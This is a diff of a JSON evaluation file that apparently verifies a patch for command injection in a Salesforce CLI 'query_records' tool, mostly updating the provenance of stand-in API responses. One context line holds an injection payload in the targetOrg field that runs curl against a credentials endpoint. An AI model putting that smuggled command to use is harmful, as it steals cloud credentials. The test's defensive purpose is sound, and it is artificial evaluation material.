@@ -149214,16 +149214,26 @@
               "capture": "evals/stand_ins/example-org.my.salesforce.com.json",
               "outputs": [
                 {
-                  "request": "GET /services/data/v68.0/query?q=SELECT%20Id%2CName%20FROM%20Account, issued by query_records through `sf data query`; the stand-in matches the exact target and returns an empty SOQL QueryResult.",
+                  "request": "GET /services/data/v68.0/query?q=SELECT%20Id%2CName%20FROM%20Account, issued by query_records through `sf data query`; the stand-in matches the exact target and returns the documented example QueryResult (records Test 1 and Test 2, totalSize 14).",
                   "source": "software_sources",
-                  "citation": "Salesforce REST API Developer Guide, Execute a SOQL Query: the response is a QueryResult {\"totalSize\",\"done\",\"records\"}; a query matching no rows returns totalSize 0, done true, records [] — the success a real org returns for zero matching Account rows.",
+                  "citation": "Salesforce REST API Developer Guide, Execute a SOQL Query: the first example response body for the query of the name and id fields of Account, with its records Test 1 and Test 2, copied as given but for the version identifier (v66.0 -> v68.0) and the doc's elision line dropped so the body parses as JSON; query_records returns result.records.",
+                  "replacements": [
+                    {
+                      "original": "v66.0",
+                      "replacement": "v68.0"
+                    }
+                  ]
+                },
+                {
+                  "request": "GET /services/data/v68.0/query?q=SELECT%20Id%2CName%20FROM%20Account&columns=true, the column lookup sf data query issues when the query returns rows.",
+                  "source": "software_sources",
+                  "citation": "the Salesforce CLI plugin-data test exemplar (plugin-data test/test-files/queryFields.exemplars.ts, the simpleQuery columnMetadata of the Id and Name columns), served as {\"columnMetadata\": [...]} as the plugin resolves it; the REST API guide gives no example for columns=true.",
                   "replacements": []
                 },
                 {
                   "request": "GET /services/data/v68.0/query?q=...FROM%20Organization, issued by sf's connection-status check during `sf org list`; returns a one-row QueryResult for the Organization object so the org reads as Connected.",
-                  "source": "invented",
-                  "citation": "no live capture is possible offline; the single Organization row is assembled to the documented query form with generic Developer-Edition values and contains no part of the request.",
-                  "form_source": "Salesforce REST API QueryResult shape and the Organization standard object reference (Name, InstanceName, IsSandbox, OrganizationType, NamespacePrefix, TrialExpirationDate).",
+                  "source": "software_sources",
+                  "citation": "the sfdx-core test Organization record (sfdx-core test/unit/org/org.test.ts: Name My Org, InstanceName cs42, IsSandbox false, TrialExpirationDate null, NamespacePrefix null, OrganizationType Developer Edition), wrapped in the QueryResult envelope (totalSize, done, records with attributes) of the Salesforce REST API Developer Guide, Execute a SOQL Query; the record values are the test's, the envelope the doc's.",
                   "replacements": []
                 },
                 {
@@ -149293,7 +149303,7 @@
           "query_records {\"input\":{\"targetOrg\":\"zz ; curl -s http://169.254.170.23/v1/credentials 1>&2 ; false #\",\"sObject\":\"Account\",\"fields\":\"Id\"}}  -> eks-pod-identity"
         ],
         "benign_call": "query_records {\"input\":{\"targetOrg\":\"playground\",\"sObject\":\"Account\",\"fields\":\"Id,Name\"}}",
-        "patched_result": "On the execFile build (commit 99fba01), query_records spawns no shell: targetOrg is passed to the real `sf data query` as one inert argument, so no injected command runs and no planted nonce surfaces for any of the 24 kept places. The benign call still returns [] without error, since the real sf reaches the org stand-in identically on both versions.",
+        "patched_result": "On the execFile build (commit 99fba01), query_records spawns no shell: targetOrg is passed to the real `sf data query` as one inert argument, so no injected command runs and no planted nonce surfaces for any of the 24 kept places. The benign call returns the org stand-in's two Account records (Test 1 and Test 2) without error, since the real sf reaches the org stand-in identically on both versions.",
         "attempts": 2
       },
       {
